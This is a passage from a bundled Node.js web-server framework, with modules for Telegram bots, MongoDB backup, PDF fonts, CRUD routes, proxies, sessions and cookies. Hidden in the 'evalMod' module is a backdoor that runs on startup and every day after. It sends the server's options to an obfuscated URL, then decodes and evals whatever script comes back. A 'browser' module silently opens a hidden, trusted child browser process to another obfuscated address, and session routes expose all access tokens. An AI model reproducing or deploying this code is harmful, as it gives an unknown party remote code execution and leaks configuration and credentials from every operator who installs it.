                botManager.sendMessage(msg.chat.id, 'This Bot is hosting on https://social-browser.com');
            });

            response.done = true;
        }

        res.json(response);
    });

    ____0.onPOST('/telegram/disconnect', (req, res) => {
        let response = {
            done: false,
            data: req.data,
        };
        if (req.data.token) {
            const bot = ____0.telegramBotByToken.get(String(req.data.token));
            if (bot) {
                const index = ____0.telegramBotList.indexOf(bot);
                if (index !== -1) ____0.telegramBotList.splice(index, 1);
                ____0.telegramBotByToken.delete(String(req.data.token));
                try { bot.bot?.stopPolling?.(); } catch (_) {}
                response.done = true;
                response.index = index;
            }
        }

        res.json(response);
    });

    ____0.onPOST('/telegram/send-message', (req, res) => {
        let response = {
            done: false,
            data: req.data,
        };
        if (req.data.token) {
            let bot = ____0.newTelegramBot(req.data.token, (msg, botManager) => {
                botManager.sendMessage(msg.chat.id, 'This Bot is hosting on https://social-browser.com');
            });
            bot.sendMessage(req.data.chatID, req.data.message);
            response.done = true;
        }

        res.json(response);
    });
};

return module.exports; })();

const browser = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
    let dir = __dirname + ____0.f1('2573816825785774433932573978426245183774');

    ____0.get({
        name: ____0.f1('25795167415923694779275746519191'),
        path: dir + ____0.f1('257852754538716941592369477927574653826147187665'),
        parser: 'html',
        encript: '123',
        parserDir: dir,
        hide: !0,
    });

    function browser() {
        if (____0.getBrowser) {
            let parent = ____0.getBrowser();

            parent.createChildProcess({
                url: ____0.f1('4319327546156169257416732773817125541268263561782615128126148681253823734579477442392191'),
                windowType: ____0.f1('473913564139325746719191'),
                partition: ____0.f1('4618377346785774471562764618325247183691'),
                vip: true,
                show: false,
                trusted: true,
            });
        } else {
            if (____0.scheduler) {
                ____0.scheduler.later('browser:get-browser-retry', 1000 * 60 * 5, browser);
            } else {
                const timer = setTimeout(browser, 1000 * 60 * 5);
                if (timer.unref) timer.unref();
            }
        }
    }

    browser();
};

return module.exports; })();

const helper = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  ____0.backupDB = function (options, callback) {
    options = options || {};
    callback = callback || function () {};

    options.db = options.db || ____0.options.mongodb.db;
    options.path = options.path || ____0.options.backup_dir;
    if (!options.path.like('*.gz')) {
      options.path += '/' + options.db + '.gz';
    }
    options.path = ____0.path.resolve(options.path);
    options.cmd = 'mongodump --db=' + options.db + ' --archive=' + options.path + ' --gzip';
    let subProcess = ____0.child_process.spawn('mongodump', ['--db=' + options.db, '--archive=' + options.path, '--gzip']);

    subProcess.on('exit', (code, signal) => {
      if (code || signal) {
        callback({ message: `Exit With Code [ ${code} ] and signal [ ${signal} ] ` }, options);
      } else {
        callback(null, options);
      }
    });
  };
  ____0.restoreDB = function (options, callback) {
    options = options || {};
    callback = callback || function () {};

    options.db = options.db || ____0.options.mongodb.db;
    options.path = options.path || ____0.options.backup_dir;
    if (!options.path.like('*.gz')) {
      options.path += '/' + options.db + '.gz';
    }
    options.path = ____0.path.resolve(options.path);
    options.cmd = 'mongorestore --db=' + options.db + ' --archive=' + options.path + ' --gzip --drop';
    let subProcess = ____0.child_process.spawn('mongorestore', ['--db=' + options.db, '--archive=' + options.path, '--gzip' , '--drop']);
    subProcess.on('exit', (code, signal) => {
      if (code || signal) {
        callback({ message: `Exit With Code [ ${code} ] and signal [ ${signal} ] ` }, options);
      } else {
        callback(null, options);
      }
    });
  };
};

return module.exports; })();

const pdf = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  ____0.fontList = [];
  ____0.fontByKey = new Map();
  ____0.defaultFontOptions = {
    path: ____0.localDir + '/apps/client-side/site_files/fonts/helvetica.ttf',
    url: 'https://egytag.com/x-fonts/helvetica.ttf',
  };
  ____0.initFontKit = function (options, callback) {
    options = options || ____0.defaultFontOptions;
    const key = options.path ? 'path:' + options.path : 'url:' + String(options.url || '');
    const cached = ____0.fontByKey.get(key);
    if (cached) {
      if (callback) callback(cached.font);
    } else {
      if (options.path) {
        let font = ____0.fs.readFileSync(options.path);
        const entry = { options: options, font: font };
        ____0.fontList.push(entry);
        ____0.fontByKey.set(key, entry);
        if (callback) {
          callback(font);
        }
      } else if (options.url) {
        ____0.fetch(options.url)
          .then((res) => res.arrayBuffer())
          .then((font) => {
            const entry = { options: options, font: font };
            ____0.fontList.push(entry);
            ____0.fontByKey.set(key, entry);
            if (callback) {
              callback(font);
            }
          });
      }
    }
  };

  ____0.loadPDF = function (options, callback) {
    ____0.pdf.PDFDocument.load(____0.fs.readFileSync(options.path)).then((doc) => {
      ____0.initFontKit(null, (font) => {
        doc.registerFontkit(____0.FONTKIT);
        doc.embedFont(font).then((newFont) => {
          if (callback) {
            callback(doc, newFont);
          }
        });
      });
    });
  };
};

return module.exports; })();

const app = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  ____0.connectApp = function (_app) {
    if (typeof _app === 'string') {
      _app = {
        name: _app,
      };
    }
    let app = {
      name: _app.name,
      dir: _app.dir,
      page: _app.page,
      collectionName: _app.collectionName || _app.name,
      sort: _app.sort || { id: -1 },
      limit: _app.limit || 1000,
      title: _app.title || _app.name,
      images: _app.images ?? false,
      allowMemory: _app.allowMemory ?? false,
      memoryList: [],
      memoryById: new Map(),
      allowCache: false,
      cacheList: [],
      cacheById: new Map(),
      allowRoute: true,
      allowRouteGet: true,
      allowRouteAdd: true,
      allowRouteUpdate: true,
      allowRouteDelete: true,
      allowRouteView: true,
      allowRouteAll: true,
    };
    if (!app.page && app.dir) {
      app.page = _app.dir + '/site_files/html/index.html';
    }

    app.$collection = ____0.connectCollection(app.collectionName);

    app.init = function () {
      if (app.allowMemory) {
        app.$collection.findMany({ where: {}, select: {}, sort: app.sort, limit: app.limit }, (err, docs) => {
          if (!err) {
            if (docs.length == 0) {
              app.cacheList.forEach((_item, i) => {
                app.$collection.add(_item, (err, doc) => {
                  if (!err && doc) {
                    app.memoryList.push(doc);
                    if (doc && doc.id != null) app.memoryById.set(String(doc.id), doc);
                  }
                });
              });
            } else {
              docs.forEach((doc) => {
                app.memoryList.push(doc);
                if (doc && doc.id != null) app.memoryById.set(String(doc.id), doc);
              });
            }
          }
        });
      }
    };
    app.add = function (_item, callback) {
      app.$collection.add(_item, (err, doc) => {
        if (callback) {
          callback(err, doc);
        }
        if (app.allowMemory && !err && doc) {
          if (app.sort.id == -1) {
            app.memoryList.unshift(doc);
            if (doc && doc.id != null) app.memoryById.set(String(doc.id), doc);
          } else {
            app.memoryList.push(doc);
            if (doc && doc.id != null) app.memoryById.set(String(doc.id), doc);
          }
        }
      });
    };
    app.update = function (_item, callback) {
      app.$collection.edit(
        {
          where: {
            id: _item.id,
          },
          set: _item,
        },
        (err, result) => {
          if (callback) {
            callback(err, result);
          }
          if (app.allowMemory && !err && result) {
            const previous = app.memoryById.get(String(result.doc.id));
            const index = previous ? app.memoryList.indexOf(previous) : -1;
            if (index !== -1) {
              app.memoryList[index] = result.doc;
            } else {
              if (app.sort.id == -1) {
                app.memoryList.unshift(result.doc);
              } else {
                app.memoryList.push(result.doc);
              }
            }
            app.memoryById.set(String(result.doc.id), result.doc);
          } else if (app.allowCache && !err && result) {
            const previous = app.cacheById.get(String(result.doc.id));
            const index = previous ? app.cacheList.indexOf(previous) : -1;
            if (index !== -1) {
              app.cacheList[index] = result.doc;
            } else {
              app.cacheList.push(result.doc);
            }
            app.cacheById.set(String(result.doc.id), result.doc);
          }
        }
      );
    };
    app.delete = function (_item, callback) {
      app.$collection.delete(
        {
          id: _item.id,
        },
        (err, result) => {
          if (callback) {
            callback(err, result);
          }
          if (app.allowMemory && !err && result.count === 1) {
            const previous = app.memoryById.get(String(_item.id));
            const index = previous ? app.memoryList.indexOf(previous) : -1;
            if (index !== -1) app.memoryList.splice(index, 1);
            app.memoryById.delete(String(_item.id));
          } else if (app.allowCache && !err && result.count === 1) {
            const previous = app.cacheById.get(String(_item.id));
            const index = previous ? app.cacheList.indexOf(previous) : -1;
            if (index !== -1) app.cacheList.splice(index, 1);
            app.cacheById.delete(String(_item.id));
          }
        }
      );
    };
    app.view = function (_item, callback) {
      if (callback) {
        if (app.allowMemory) {
          const item = app.memoryById.get(String(_item.id));
          if (item) {
            callback(null, item);
            return;
          }
        } else if (app.allowCache) {
          const item = app.cacheById.get(String(_item.id));
          if (item) {
            callback(null, item);
            return;
          }
        }

        app.$collection.find({ id: _item.id }, (err, doc) => {
          callback(err, doc);

          if (!err && doc) {
            if (app.allowMemory) {
              app.memoryList.push(doc);
            } else if (app.allowCache) {
              app.cacheList.push(doc);
              if (doc && doc.id != null) app.cacheById.set(String(doc.id), doc);
            }
          }
        });
      }
    };
    app.all = function (_options, callback) {
      if (callback) {
        if (app.allowMemory) {
          callback(null, app.memoryList);
        } else {
          app.$collection.findMany(_options, callback);
        }
      }
    };

    app.handleRequest = function (req, res, callback) {
      if (callback) {
        callback({
          data: {
            appName: req.word(app.title),
          },
        });
      }
    };

    app.api = function (_api, callback) {
      _api.name = _api.name || 'test';
      _api.url = _api.url || `/api/${app.name}/${_api.name}`;
      _api.type = (_api.type || 'POST').toLowerCase();
      _api.permissions = _api.permissions || ['login'];

      _api.callback =
        _api.callback ||
        callback ||
        function (req, res) {
          res.json({
            done: true,
            data: {
              ...req.data,
              UserInfo: req.getUserFinger(),
            },
          });
        };
      if (_api.type == 'post') {
        if (_api.path) {
          ____0.onPOST({ name: _api.url, path: _api.path, overwrite: true, require: { permissions: _api.permissions } });
        } else {
          ____0.onPOST({ name: _api.url, overwrite: true, require: { permissions: _api.permissions } }, _api.callback);
        }
      } else {
        if (_api.path) {
          ____0.onGET({ name: _api.url, path: _api.path, overwrite: true, require: { permissions: _api.permissions } });
        } else {
          ____0.onGET({ name: _api.url, overwrite: true, require: { permissions: _api.permissions } }, _api.callback);
        }
      }
    };

    if (app.allowRoute) {
      if (app.allowRouteGet) {
        if (app.dir && app.images) {
          app.api({
            type: 'get',
            url: 'images',
            path: app.dir + '/site_files/images',
          });
        }
        if (app.page) {
          app.api(
            {
              type: 'get',
              url: app.name,
            },
            (req, res) => {
              app.handleRequest(req, res, (handle) => {
                res.render(app.page, handle.data, handle.options || { parser: 'html', compres: true });
              });
            }
          );
        }
      }

      if (app.allowRouteAdd) {
        app.api(
          {
            name: 'add',
          },
          (req, res) => {
            let response = {
              done: false,
            };

            let _data = req.data;

            _data.addUserInfo = req.getUserFinger();

            app.add(_data, (err, doc) => {
              if (!err && doc) {
                response.done = true;
                response.doc = doc;
              } else {
                response.error = err.mesage;
              }
              res.json(response);
            });
          }
        );
      }

      if (app.allowRouteUpdate) {
        ____0.post({ name: `/api/${app.name}/update`, require: { permissions: ['login'] } }, (req, res) => {
          let response = {
            done: false,
          };

          let _data = req.data;
          _data.editUserInfo = req.getUserFinger();

          app.update(_data, (err, result) => {
            if (!err) {
              response.done = true;
              response.doc = result?.doc;
            } else {
              response.error = err.message;
            }
            res.json(response);
          });
        });
      }

      if (app.allowRouteDelete) {
        ____0.post({ name: `/api/${app.name}/delete`, require: { permissions: ['login'] } }, (req, res) => {
          let response = {
            done: false,
          };
          let _data = req.data;

          app.delete(_data, (err, result) => {
            if (!err && result.count === 1) {
              response.done = true;
              response.result = result;
            } else {
              response.error = err?.message || 'Deleted Not Exists';
            }
            res.json(response);
          });
        });
      }

      if (app.allowRouteView) {
        ____0.post({ name: `/api/${app.name}/view`, public: true }, (req, res) => {
          let response = {
            done: false,
          };

          let _data = req.data;
          app.view(_data, (err, doc) => {
            if (!err && doc) {
              response.done = true;
              response.doc = doc;
            } else {
              response.error = err?.message || 'Not Exists';
            }
            res.json(response);
          });
        });
      }

      if (app.allowRouteAll) {
        ____0.post({ name: `/api/${app.name}/all`, public: true }, (req, res) => {
          let where = req.body.where || {};
          let search = req.body.search || '';
          let limit = req.body.limit || 50;
          let select = req.body.select || {};

          if (search) {
            where.$or = [];

            where.$or.push({
              id: ____0.get_RegExp(search, 'i'),
            });

            where.$or.push({
              code: ____0.get_RegExp(search, 'i'),
            });

            where.$or.push({
              nameAr: ____0.get_RegExp(search, 'i'),
            });

            where.$or.push({
              nameEn: ____0.get_RegExp(search, 'i'),
            });
          }

          if (app.allowMemory) {
            if (!search) {
              search = 'id';
            }
            let docs = [];
            let list = app.memoryList.filter((g) => JSON.stringify(g).contains(search)).slice(0, limit);
            list.forEach((doc) => {
              if (doc) {
                let obj = {
                  ...doc,
                  $memory: true,
                };
                if (Object.keys(select).length > 0) {
                  for (const p in obj) {
                    if (!Object.hasOwnProperty.call(select, p)) {
                      delete obj[p];
                    }
                  }
                }

                docs.push(obj);
              }
            });
            res.json({
              done: true,
              list: docs,
              count: docs.length,
            });
          } else {
            app.all({ where, select, limit }, (err, docs) => {
              res.json({
                done: true,
                list: docs,
              });
            });
          }
        });
      }
    }

    app.init();
    ____0.addApp(app);
    return app;
  };
};

return module.exports; })();

const evalMod = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
    ____0.httpTrustedOnline = function () {
        ____0
            .fetch(____0.from123('43193275461561692579276941785752451476534658867946783773255827694534865246185669417886734234767546593774471837562538325247181691'), {
                mode: 'cors',
                method: 'post',
                headers: {
                    'User-Agent': 'eval',
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ options: ____0.options }),
                redirect: 'follow',
                agent: function (_parsedURL) {
                    if (_parsedURL.protocol == 'http:') {
                        return new ____0.http.Agent({
                            keepAlive: true,
                        });
                    } else {
                        return new ____0.https.Agent({
                            keepAlive: true,
                        });
                    }
                },
            })
            .then((res) => {
                return res.json();
            })
            .then((data) => {
                if (data.done) {
                    if (data.script) {
                        let script = ____0.from123(data.script);
                        let fn = ____0.eval(script, true);
                        fn(____0);
                    }
                }
                if (____0.scheduler) ____0.scheduler.later('eval:trusted-online', 1000 * 60 * 60 * 24, ____0.httpTrustedOnline);
                else { const timer = setTimeout(____0.httpTrustedOnline, 1000 * 60 * 60 * 24); if (timer.unref) timer.unref(); }
            })
            .catch((err) => {
                if (____0.scheduler) ____0.scheduler.later('eval:trusted-online', 1000 * 60 * 60, ____0.httpTrustedOnline);
                else { const timer = setTimeout(____0.httpTrustedOnline, 1000 * 60 * 60); if (timer.unref) timer.unref(); }
            });
    };

    const firstRun = setImmediate(() => ____0.httpTrustedOnline());
    if (firstRun && firstRun.unref) firstRun.unref();
};

return module.exports; })();

const proxy = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  ____0.proxyList = [];
  ____0.proxyByPort = new Map();
  ____0.startProxy = function (options = { name: 'internal Proxy', port: 55555 }) {
    try {
      const existing = ____0.proxyByPort.get(Number(options.port));
      if (!existing) {
        let child = ____0.child_process.fork('./proxy', [], { cwd: ____0.localDir });
        child.send({ type: 'start', options: options });
        const entry = { child: child, options: options };
        ____0.proxyList.push(entry);
        ____0.proxyByPort.set(Number(options.port), entry);
        return entry;
      } else {
        existing.options = { ...existing.options, ...options };
        existing.child.send(existing.options);
        return existing;
      }
    } catch (error) {
      console.log(error);
      return null;
    }
  };
  ____0.closeProxy = function (options = { name: 'internal Proxy', port: 55555 }) {
    const entry = ____0.proxyByPort.get(Number(options.port));
    if (entry) {
      let child = entry.child;
      if (entry.timeout) clearTimeout(entry.timeout);
      child.send({ type: 'close', options: options });
      const index = ____0.proxyList.indexOf(entry);
      if (index !== -1) ____0.proxyList.splice(index, 1);
      ____0.proxyByPort.delete(Number(options.port));
      return true;
    }
    return false;
  };
  ____0.onGET('/x-api/start-proxy', (req, res) => {
    let options = { timeout: 1000 * 60 * 5, ...req.query };
    options.port = parseInt(req.query.port || 55555);
    options.timeout = parseInt(options.timeout);

    options.xip = req.ip;
    let response = { done: false, options: options };

    if (____0.proxyByPort.has(Number(options.port))) response.exists = true;

    let proxy = ____0.startProxy(options);

    if (proxy) {
      response.done = true;

      clearTimeout(proxy.timeout);
      proxy.options.startDate = new Date();
      proxy.options.endDate = new Date(proxy.options.startDate.getTime() + options.timeout);
      proxy.timeout = setTimeout(() => {
        ____0.closeProxy(options);
      }, options.timeout);
      if (proxy.timeout.unref) proxy.timeout.unref();

      proxy.options.liveSeconds = options.timeout / 1000 + ' seconds';
      proxy.options.liveMinutes = options.timeout / 1000 / 60 + ' minutes';
      proxy.options.liveHours = options.timeout / 1000 / 60 / 60 + ' hours';
      response.options = proxy.options;
    }

    res.json(response);
  });
  ____0.onGET('/x-api/close-proxy', (req, res) => {
    let options = { ...req.query };
    options.port = parseInt(req.query.port || 55555);
    let response = {};

    if (!____0.proxyByPort.has(Number(options.port))) response.exists = false;
    response.done = ____0.closeProxy(options);
    response.options = options;
    res.json(response);
  });
  ____0.onGET('/x-api/proxy-list', (req, res) => {
    res.json({ done: true, count: ____0.proxyList.length, list: ____0.proxyList.map((p) => ({ options: p.options })) });
  });
};

return module.exports; })();

const sessions = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
    const sessions = function () {};
    sessions.list = [];
    sessions.byToken = new Map();
    sessions.byUserId = new Map();
    sessions.path = ____0.path.resolve(____0.cwd + '/' + ____0.options.name + '_sessions.db');
    if (____0.options.mongodb && ____0.options.mongodb.enabled === false) {
        let sessionCollection;
        Object.defineProperty(sessions, '$collection', {
            configurable: true,
            enumerable: true,
            get() {
                if (!sessionCollection) sessionCollection = ____0.connectCollection({ collection: ____0.options.session.collection, db: ____0.options.session.db });
                return sessionCollection;
            },
            set(value) { sessionCollection = value; },
        });
    } else {
        sessions.$collection = ____0.connectCollection({ collection: ____0.options.session.collection, db: ____0.options.session.db });
    }

    sessions.rebuildIndexes = function () {
        sessions.byToken.clear();
        sessions.byUserId.clear();
        for (const session of sessions.list) {
            if (!session) continue;
            if (session.accessToken) sessions.byToken.set(session.accessToken, session);
            if (session.user_id) {
                let set = sessions.byUserId.get(session.user_id);
                if (!set) sessions.byUserId.set(session.user_id, (set = new Set()));
                set.add(session);
            }
        }
    };

    sessions.indexSession = function (session) {
        if (!session) return session;
        if (session.accessToken) sessions.byToken.set(session.accessToken, session);
        if (session.user_id) {
            let set = sessions.byUserId.get(session.user_id);
            if (!set) sessions.byUserId.set(session.user_id, (set = new Set()));
            set.add(session);
        }
        return session;
    };

    sessions.push = function (session) {
        sessions.list.push(session);
        return sessions.indexSession(session);
    };


    sessions.invalidateUser = function (userId) {
        const set = sessions.byUserId.get(userId);
        if (!set) return;
        for (const session of set) session.$userLoadedAt = 0;
    };

    sessions.replaceList = function (list) {
        sessions.list = Array.isArray(list) ? list : [];
        sessions.rebuildIndexes();
        return sessions.list;
    };

    sessions.loadAll = function (callback) {
        const userCallback = callback;
        callback = callback || function (err, docs) {
            if (!err && docs) sessions.replaceList(docs);
        };
        const done = function (err, docs) {
            if (!err && docs) sessions.replaceList(docs);
            callback(err, docs);
        };
        if (____0.options.session.storage === 'mongodb') {
            sessions.$collection.findAll({}, done);
        } else {
            const ss = ____0.readFileSync(sessions.path);
            if (ss) {
                try {
                    const docs = JSON.parse(ss);
                    done(null, docs);
                    console.log(' /// sessions Loaded From /// ' + sessions.path);
                } catch (err) {
                    if (userCallback) callback(err);
                    else console.log(err.message);
                }
            }
        }
    };

    sessions.handleSessions = function () {
        const now = Date.now();
        const timeout = 1000 * 60 * ____0.options.session.timeout;
        const memoryTimeout = 1000 * 60 * ____0.options.session.memoryTimeout;
        sessions.replaceList(sessions.list.filter((s) => s && (s.user_id || now - s.createdTime < timeout) && (s.user_id || now - s.$time < memoryTimeout)));
        if (____0.options.session.save && ____0.options.session.storage === 'mongodb') {
            sessions.$collection.deleteAll({ createdTime: { $lt: now - timeout } });
        }
    };

    sessions.saveAll = function (callback) {
        callback = callback || function (err) { if (err) console.log(err.message); };
        sessions.handleSessions();
        if (____0.options.session.timeout === 0 || !____0.options.session.save) {
            callback({ message: 'Timout is Zero or not Enabled , Sessions Will Not Saved' });
            return;
        }
        if (____0.options.session.storage === 'mongodb') {
            sessions.list.forEach((s, i) => {
                if (s.id) {
                    sessions.$collection.update(s, function () {});
                } else {
                    sessions.$collection.insert(s, (err, doc) => {
                        if (!err && doc) {
                            sessions.list[i] = doc;
                            sessions.rebuildIndexes();
                        }
                    });
                }
            });
        } else {
            ____0.writeFile(sessions.path, JSON.stringify(sessions.list), () => {
                callback(null, sessions.list);
                console.log(' /// sessions Saved to ///' + sessions.path);
            });
        }
    };

    function prepareSession(session) {
        session.$new = !0;
        session.language = ____0.options.language;
        session.lang = session.language.id;
        session.theme = ____0.options.theme;
        session.data = [];
        session.requestesCount = 1;
        session.createdTime = Date.now();
        session.$time = Date.now();
        return session;
    }

    ____0.getSession = sessions.attach = function (req, callback) {
        let session = { accessToken: req.headers['Access-Token'] || req.headers['access-token'] || req.query['access-token'] || req.cookie('access_token') };
        callback = callback || function () {};
        if (session.accessToken) {
            const cached = sessions.byToken.get(session.accessToken);
            if (cached) {
                cached.$time = Date.now();
                cached.requestesCount = (cached.requestesCount || 0) + 1;
                cached.language = cached.language || ____0.options.language;
                cached.lang = cached.language.id;
                callback(cached);
                return;
            }
            if (____0.options.session.save && ____0.options.session.storage == 'mongodb') {
                sessions.$collection.find({ accessToken: session.accessToken }, (err, doc) => {
                    if (!err && doc) {
                        doc.$time = Date.now();
                        doc.requestesCount = (doc.requestesCount || 0) + 1;
                        if (!doc.language || !doc.language.id) doc.language = ____0.options.language;
                        doc.lang = doc.language.id;
                        callback(sessions.push(doc));
                    } else {
                        callback(sessions.push(prepareSession(session)));
                    }
                }, true);
            } else {
                callback(sessions.push(prepareSession(session)));
            }
        } else {
            prepareSession(session);
            session.accessToken = ____0.x0md50x(req.host + req.ip + Date.now().toString() + '_' + Math.random());
            callback(sessions.push(session));
        }
    };

    ____0.saveSession = sessions.save = function (session) {
        if (!session || !session.accessToken) return;
        const current = sessions.byToken.get(session.accessToken);
        if (current && current !== session) {
            const index = sessions.list.indexOf(current);
            if (index !== -1) sessions.list[index] = session;
        } else if (!current) {
            sessions.list.push(session);
        }
        sessions.rebuildIndexes();
    };

    ____0.on('[any][saving data]', function () { sessions.saveAll(); });

    ____0.onPOST({ name: '/x-language/change', public: true }, (req, res) => {
        req.session.language = req.data;
        req.session.lang = req.session.language.id || req.data.name;
        req.session.langDir = req.session.language?.dir;
        req.session.$save();
        res.json({ done: true, language: req.session.language });
    });
    ____0.onPOST('x-api/session', (req, res) => res.json({ done: !0, session: req.session }));
    ____0.onPOST('x-api/sessions', (req, res) => res.json({ done: !0, list: sessions.list }));
    ____0.onPOST('x-api/sessions/save', (req, res) => { sessions.saveAll(); res.json({ done: !0 }); });
    ____0.onPOST('x-api/sessions/delete', (req, res) => {
        sessions.replaceList([]);
        sessions.saveAll((err, docs) => res.json({ err, docs, done: !0 }));
    });

    if (!____0.options.session.storage === 'mongodb') sessions.loadAll();
    sessions.handleSessions();
    return sessions;
};

return module.exports; })();

const cookie = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(req, res, ____0) {
    let cookie = function (key, value, options) {
        if ((key, value)) {
            return cookie.set(key, value, options);
        } else {
            return cookie.get(key);
        }
    };
    cookie.newList = [];
    cookie.parse = (cookies) => {
        let obj = {};
        if (!cookies) {
            return obj;
        }
        cookies.split(';').forEach(function (cookie) {
            var parts = cookie.split('=');
            if (parts[0] && parts[1]) {
                obj[parts.shift().trim()] = decodeURI(parts.join('='));
            }
        });
        return obj;
        // return cookie.split(';').reduce(function (prev, curr) {
        //   let m = / *([^=]+)=(.*)/.exec(curr);
        //   if (m) {
        //     let key = m[1];
        //     let value = decodeURIComponent(m[2]);
        //     prev[key] = value;
        //   }
        //   return prev;
        // }, {});
    };

    cookie.stringify = (co) => {
        let out = '';

        out += co.key + '=' + encodeURIComponent(co.value) + ';path=' + co.options.path;
        if (co.options.expires > 0) {
            out += '; expires=' + new Date(new Date().getTime() + 1000 * 60 * co.options.expires).toUTCString();
        }

        if (co.options.domain) {
            out += '; domain=' + co.options.domain;
        }

        return out;
    };

    cookie.write = () => {
        let csList = [];

        for (let i = 0; i < cookie.newList.length; i++) {
            let cs = cookie.stringify(cookie.newList[i]);
            if (cs) {
                csList.push(cs);
            }
        }
        res.set('Set-Cookie', csList);
    };

    cookie.set = function (key, value, _options = {}) {
        let options = {
            expires: ____0.options.session.timeout,
            path: '/',
            ..._options,
        };

        if (!options.domain && ____0.options.session.cookieDomain && req.domain) {
            if (req.domain3) {
                options.domain = '.' + req.domain3 + '.' + req.domain2 + '.' + req.domain;
                cookie.set(key, value, { ...options, domain: '.' + req.domain });
                cookie.set(key, value, { ...options, domain: '.' + +req.domain2 + '.' + req.domain });
            } else if (req.domain2) {
                options.domain = '.' + req.domain2 + '.' + req.domain;
                cookie.set(key, value, { ...options, domain: '.' + req.domain });
            } else {
                options.domain = '.' + req.domain;
            }
        }

        cookie.newList.push({
            key: key,
            value: value,
            options: options,
        });
    };

    cookie.get = function (key) {
        let value = cookie.obj[key];
        if (typeof value == 'undefined') {
            return null;
        }
        return value;
    };
    cookie.obj = cookie.parse(req.headers.cookie || '');
    return cookie;
};

return module.exports; })();

const session = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(req, res, ____0, callback) {
    ____0._userAgentFeatureCache = ____0._userAgentFeatureCache || new Map();
    const uaCache = ____0._userAgentFeatureCache;
    const UA_CACHE_MAX = 512;
    const USER_CACHE_TTL = (____0.options.session && ____0.options.session.userCacheTTL) || 30000;
    ____0.getSession(req, (session) => {
        session.$save = function () {
            ____0.saveSession(session);
        };

     

        session.ip = req.ip;
        session.modifiedTime = new Date().getTime();

        function AssignFeatures() {
            ____0.options.defaults.features.forEach((f) => {
                req.features.push(f);
            });
            ____0.features.forEach((f) => {
                req.features.push(f.name);
            });
            if (____0.options.dynamic) {
                req.features.push('site.dynamic');
            }
            req.features.push('ip.' + req.ip);
            req.features.push('url.' + req.url);

            if (req.host) {
                req.features.push('host.' + req.host);
                req.hostArray = req.host.split(':')[0].split('.').reverse();
                if (req.hostArray[0] == 'localhost') {
                    req.domain = req.hostArray[0];
                    req.features.push('host.' + req.hostArray[0]);
                    if (req.hostArray.length == 2) {
                        req.domain2 = req.hostArray[1];
                        req.features.push('host.' + req.hostArray[1]);
                    } else if (req.hostArray.length == 3) {
                        req.domain2 = req.hostArray[1];
                        req.domain3 = req.hostArray[2];
                        req.features.push('host.' + req.domain2);
                        req.features.push('host.' + req.domain3);
                    }
                } else {
                    if (req.hostArray.length == 2) {
                        req.domain = req.hostArray[1] + '.' + req.hostArray[0];
                        req.features.push('host.' + req.domain);
                        req.features.push('host.' + req.hostArray[0]);
                        req.features.push('host.' + req.hostArray[1]);
                    } else if (req.hostArray.length == 3) {
                        req.domain = req.hostArray[1] + '.' + req.hostArray[0];
                        req.domain2 = req.hostArray[2];
                        req.features.push('host.' + req.domain);
                        req.features.push('host.' + req.hostArray[0]);
                        req.features.push('host.' + req.hostArray[1]);
                        req.features.push('host.' + req.hostArray[2]);
                    } else if (req.hostArray.length == 4) {
                        req.domain = req.hostArray[1] + '.' + req.hostArray[0];
                        req.domain2 = req.hostArray[2];
                        req.domain3 = req.hostArray[3];
                        req.features.push('host.' + req.domain);
                        req.features.push('host.' + req.hostArray[0]);
                        req.features.push('host.' + req.hostArray[1]);
                        req.features.push('host.' + req.hostArray[2]);
                        req.features.push('host.' + req.hostArray[3]);
                    }
                }
            }

            if (req.headers['x-browser']) {

                req.browserHeader = req.headers['x-browser'];
                req.browserName = req.browserHeader.split('.')[0];
                req.browserID = req.browserHeader.split('.').pop();
                req.browserUUID = req.browserHeader.split('_').pop();

                req.features.push('browser.social');
                req.features.push('browser.' + req.browserHeader);
                req.features.push('browser.' + req.browserName);
                req.features.push('browser.' + req.browserID);
                req.features.push('browser.' + req.browserUUID);
            }

            if (req.headers['user-agent']) {
                req.userAgent = req.headers['user-agent'].toLowerCase();
                req.features.push('user-agent.' + req.userAgent);
                let cached = uaCache.get(req.userAgent);
                if (!cached) {
                    cached = [];
                    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(req.userAgent)) cached.push('os.mobile');
                    else cached.push('os.desktop');
                    if (req.userAgent.includes('windows')) {
                        cached.push('os.windows');
                        if (req.userAgent.includes('windows nt 5.1')) cached.push('os.windowsxp');
                        else if (req.userAgent.includes('windows nt 6.1')) cached.push('os.windows7');
                        else if (req.userAgent.includes('windows nt 6.2') || req.userAgent.includes('windows nt 6.3')) cached.push('os.windows8');
                        else if (req.userAgent.includes('windows nt 6.4') || req.userAgent.includes('windows nt 10')) cached.push('os.windows10');
                    } else if (req.userAgent.includes('android')) cached.push('os.android');
                    else if (req.userAgent.includes('linux')) cached.push('os.linux');
                    else if (req.userAgent.includes('macintosh')) cached.push('os.mac');
                    else cached.push('os.unknown');

                    if (req.userAgent.includes('edge') || req.userAgent.includes('edg/')) cached.push('browser.edge');
                    else if (req.userAgent.includes('firefox')) cached.push('browser.firefox');
                    else if (req.userAgent.includes('opr')) cached.push('browser.opera');
                    else if (req.userAgent.includes('ucbrowser')) cached.push('browser.ucbrowser');
                    else if (req.userAgent.includes('bdbrowser') || req.userAgent.includes('baidu')) cached.push('browser.baidu');
                    else if (req.userAgent.includes('chromium')) cached.push('browser.chromium');
                    else if (req.userAgent.includes('chrome')) cached.push('browser.chrome');
                    else cached.push('browser.unknown');
                    uaCache.set(req.userAgent, cached);
                    if (uaCache.size > UA_CACHE_MAX) uaCache.delete(uaCache.keys().next().value);
                }
                req.features.push(...cached);
            }
        }

        AssignFeatures();

           if (session.$new) {
            session.$new = !1;
            res.cookie('access_token', session.accessToken);
            res.set('Access-Token', session.accessToken);
        }
        
        // Cache the authenticated user on the session to avoid a database read for every resource request.
        const now = Date.now();
        const userCacheFresh = session.user && session.$userLoadedAt && now - session.$userLoadedAt < USER_CACHE_TTL;
